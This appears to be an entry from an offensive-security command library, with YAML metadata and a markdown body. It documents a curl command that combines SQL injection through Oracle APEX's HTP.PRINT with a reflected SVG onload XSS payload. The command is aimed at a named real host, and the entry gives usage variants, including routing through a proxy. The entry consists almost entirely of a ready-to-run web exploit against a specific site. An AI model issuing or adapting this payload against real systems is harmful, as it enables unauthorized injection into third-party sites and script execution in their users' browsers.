---
data: >-
  curl "http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive)
  <svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')>" -d ":1=positive)
  <svg/onload=prompt('XSS via sql injection')>" -v
tags:
  - xss
  - sqli
  - javascript
type: command
output: Execution of JavaScript prompt('XSS via sql injection')
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.725Z'
id: 5b467d18-f93b-490a-9172-51a0dea686ba
verified: false
validated: true
submitted: true
---
# xss-via-sqli-payload

## Command

```bash
curl "http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive) <svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')>" -d ":1=positive) <svg/onload=prompt('XSS via sql injection')>" -v
```

## Description

Injects an XSS payload via SQLi using HTP.PRINT to output executable JavaScript in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Endpoint with HTP.PRINT payload | Yes |
| -d | Malicious :1 content | Yes |
| -v | Verbose | No |

## Examples

### Basic Usage

```bash
curl "http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=..." -d ":1=..." -v
```

### Advanced Usage

```bash
curl -x http://proxy:8080 "http://ipm.informatica.com/pls/apex/f?..." -d ":1=..." -v
```

## Expected Output

Reflected SVG with onload prompt executing in browser.

## Related

- [[commands/extract-db-version-payload]]
- [[procedures/Execute-XSS-via-SQL-Injection-in-Oracle-APEX]]
